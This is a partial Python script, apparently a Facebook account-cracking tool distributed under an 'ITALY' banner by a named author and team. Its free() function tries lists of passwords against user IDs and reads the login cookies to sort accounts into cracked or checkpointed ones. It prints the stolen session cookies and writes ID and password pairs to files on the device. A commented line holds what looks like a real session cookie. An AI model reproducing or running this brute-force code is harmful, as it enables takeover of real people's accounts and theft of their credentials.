...
logo =("""\x1b[1;97m
\x1b[1;32m/$$$$$$ /$$$$$$$$ /$$$$$$  /$$   /$$     /$$
\x1b[1;92m|_  $$_/|__  $$__//$$__  $$| $$  |  $$   /$$/
\x1b[1;32m  | $$     | $$  | $$  \ $$| $$   \  $$ /$$/ 
\x1b[1;92m  | $$     | $$  | $$$$$$$$| $$    \  $$$$/  
\x1b[1;32m  | $$     | $$  | $$__  $$| $$     \  $$/   
\x1b[1;92m  | $$     | $$  | $$  | $$| $$      | $$    
\x1b[1;32m /$$$$$$   | $$  | $$  | $$| $$$$$$$$| $$    
\x1b[1;92m|______/   |__/  |__/  |__/|________/|__/    
                                                                                                                                                                              
\x1b[1;97m[*]----------------------------------------------
\033[1;37m[*] Author        : AQEEL
\033[1;37m[*] Github        : MUGHAL0785
\033[1;37m[*] Status        : FREE
\033[1;37m[*] TEAM          : MUGHAL-BROTHERS
\033[1;37m[*] UPDATE BY     : AQEEL-MUGHAL
...
def free(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
           ...
           # 'cookie': 'datr=DmD5ZHBbZvN6DdgJSmvxLzzm; sb=DmD5ZKZuitVgAmRpAybRztca; fr=00mV4d8GGqy4iegNU.AWVTKaDU5NB9Ou6ZpXr3j2rWWAE.Bk-WAg.Fc.AAA.0.0.Bk-WAg.AWXx9qtMLw4; zsh=ASSKZmLPVS4AHS4atWaYCKkgX_BYjERA5wI3gq2QnT3LqGlHY7S65U5E7MrIe3xxYqNpmiEJ-6puGWUHKc3oBXkHI7d3LAhKPd9aOecoOnpxIlkYYIX6uZSFvxkdqd7Nb0xFreE5fSJ6s2JBmXagk0uqdhX9kfFbAV6f68QTO5fRQ8np30cLyxWu47JwFTpsCleBgjH3JO-XJ4etPmPqQhcjpAevYAKXoloN8-4h9h0LQCQgeXrov5DIz2Xw_EnT3Z-QECvltBPqS9y13kYPMRwVALG9Hor7HtU4ntLS53GV4MVJC596iwuQPcWDU4xx',
           'dpr': '1.875',
          ...
          'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[ITALY-,OK-💙]  ' +cid+ ' | ' +ps+    '\033[0;97m')
                print(f"{H} [COOKIE] {coki}")
                open('/sdcard/ITALY-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\33[1;31m[ITALY-CP-💚]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ITALY-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            elif '/x/checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\33[1;31m[TEAM-Lock💔]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                #open('/sdcard/ITALY-CP.txt', 'a').write( cid+' | '+ps+' \n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s|ITALY-OK:\033[1;32m%s\033[1;37m:\033[1;31m%s\033[1;37m '%(loop,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
